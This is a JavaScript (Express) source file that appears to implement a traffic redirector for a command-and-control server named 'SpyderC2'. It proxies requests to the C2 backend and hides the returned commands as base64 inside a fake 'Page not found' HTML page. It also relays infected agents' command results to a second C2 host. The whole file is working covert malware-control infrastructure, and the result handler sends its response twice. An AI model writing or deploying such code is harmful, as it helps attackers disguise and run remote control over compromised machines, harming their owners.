const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

app.get('*', async (req, res) => {
    try {
        // Call to C2
        const respuestaC2 = await fetch('http://spyderc2:8080' + req.url, {
            method: 'GET',
            headers: {
                ...req.headers,
                host: 'spyder'                    
            }
        });
        
        let datosC2 = await respuestaC2.text();

        // HTML as respond with hidden command
        return res.send(`
            <html>
                <body>
                    <h1>Page not found</h1>
                    <p>Sorry for the inconvenience.</p>
                    <!-- C2_DATA:${Buffer.from(datosC2).toString('base64')}:C2_DATA --> 
                </body>
            </html>
        `);
    } catch (e) {
        console.error("Error contacting SpyderC2:", e);
        return res.status(404).send("Not Found");
    }
});

app.use(express.json());

        app.post('/result', async (req, res) => {

        const { command, output } = req.body;

        console.log("\n[+] RESULT OF THE AGENT");
        console.log("CMD:", command);
        console.log("OUT:", output);

        try {

            // Forward result to C2
            await fetch('http://c2:5000/result', { //ajustar a spyder
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({command, output})
            });
    
            res.send("OK");
    
        } catch (e) {
            console.log("Error forwarding result to C2:", e);
            res.status(500).send("ERROR");
        }

        res.send("OK");
        });

app.listen(3000);